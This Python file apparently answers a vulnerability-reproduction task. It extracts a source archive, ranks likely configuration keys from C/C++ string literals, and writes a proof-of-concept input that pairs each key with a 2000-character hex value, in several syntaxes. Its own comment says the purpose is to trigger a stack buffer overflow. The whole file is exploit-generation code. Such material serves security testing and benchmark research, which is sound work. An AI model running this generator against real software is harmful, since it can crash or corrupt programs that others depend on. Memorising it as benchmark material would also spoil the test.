import os
import tarfile
import tempfile
import re


class Solution:
    def solve(self, src_path: str) -> bytes:
        def extract_sources(tar_path: str, dst: str) -> None:
            try:
                with tarfile.open(tar_path, "r:*") as tf:
                    tf.extractall(dst)
            except Exception:
                # If extraction fails, do nothing; caller will handle fallback
                pass

        def find_candidate_keys(root: str) -> list:
            candidates = {}
            # Patterns and keywords to infer config-related strings
            str_lit_pattern = re.compile(r'"([^"\\]|\\.)*"')
            allowed_pattern = re.compile(r'^[A-Za-z_][A-Za-z0-9_.-]{0,63}$')

            config_keywords = ("config", "cfg", "conf", "ini")
            parse_keywords = ("parse", "read", "load", "scan")
            opt_keywords = ("opt", "option", "setting", "param", "key", "value", "hex")

            for dirpath, _, filenames in os.walk(root):
                for fname in filenames:
                    if not fname.endswith((".c", ".h", ".cpp", ".cc", ".hpp", ".cxx", ".C", ".H")):
                        continue
                    fpath = os.path.join(dirpath, fname)
                    try:
                        with open(fpath, "r", encoding="utf-8", errors="ignore") as f:
                            for line in f:
                                line_lower = line.lower()
                                for m in str_lit_pattern.finditer(line):
                                    literal = m.group(0)
                                    if len(literal) < 2:
                                        continue
                                    s = literal[1:-1]
                                    if not allowed_pattern.match(s):
                                        continue
                                    score = candidates.get(s, 0)
                                    if any(kw in line_lower for kw in config_keywords):
                                        score += 5
                                    if any(kw in line_lower for kw in parse_keywords):
                                        score += 2
                                    if any(kw in line_lower for kw in opt_keywords):
                                        score += 2
                                    s_lower = s.lower()
                                    if "hex" in s_lower:
                                        score += 5
                                    if "color" in s_lower or "rgb" in s_lower:
                                        score += 1
                                    candidates[s] = score
                    except Exception:
                        continue

            if not candidates:
                return []

            sorted_keys = sorted(
                candidates.items(),
                key=lambda kv: (-kv[1], len(kv[0]), kv[0]),
            )
            return [k for k, _ in sorted_keys]

        # Main logic
        with tempfile.TemporaryDirectory() as tmpdir:
            extract_sources(src_path, tmpdir)
            keys = find_candidate_keys(tmpdir)

        if not keys:
            # Fallback generic keys if we couldn't analyze sources
            keys = ["hex", "key", "value"]

        # Limit number of keys to keep PoC size reasonable
        max_keys = 20
        top_keys = keys[:max_keys]

        # Ensure some common generic keys are present
        for fb in ("hex", "key", "value"):
            if fb not in top_keys:
                top_keys.append(fb)

        best_key = top_keys[0]

        # Long hex body to trigger stack buffer overflow
        hex_len = 2000
        hex_digits = "A" * hex_len
        hex_with_0x = "0x" + hex_digits

        lines = []

        # Primary lines for the best key (placed first to maximize impact)
        lines.append(f"{best_key}={hex_digits}")
        lines.append(f"{best_key} {hex_digits}")
        lines.append(f'{best_key}="{hex_digits}"')
        lines.append(f"{best_key}={hex_with_0x}")
        lines.append(f"{best_key} {hex_with_0x}")
        lines.append(f'{best_key}="{hex_with_0x}"')

        # Additional keys with multiple common config syntaxes
        for key in top_keys[1:]:
            lines.append(f"{key}={hex_digits}")
            lines.append(f"{key} {hex_digits}")
            lines.append(f'{key}="{hex_digits}"')
            lines.append(f"{key}={hex_with_0x}")
            lines.append(f"{key} {hex_with_0x}")
            lines.append(f'{key}="{hex_with_0x}"')

        # Also include plain hex lines for harnesses that treat entire input as hex
        lines.append(hex_digits)
        lines.append(hex_with_0x)

        poc = "\n".join(lines) + "\n"
        return poc.encode("ascii", errors="ignore")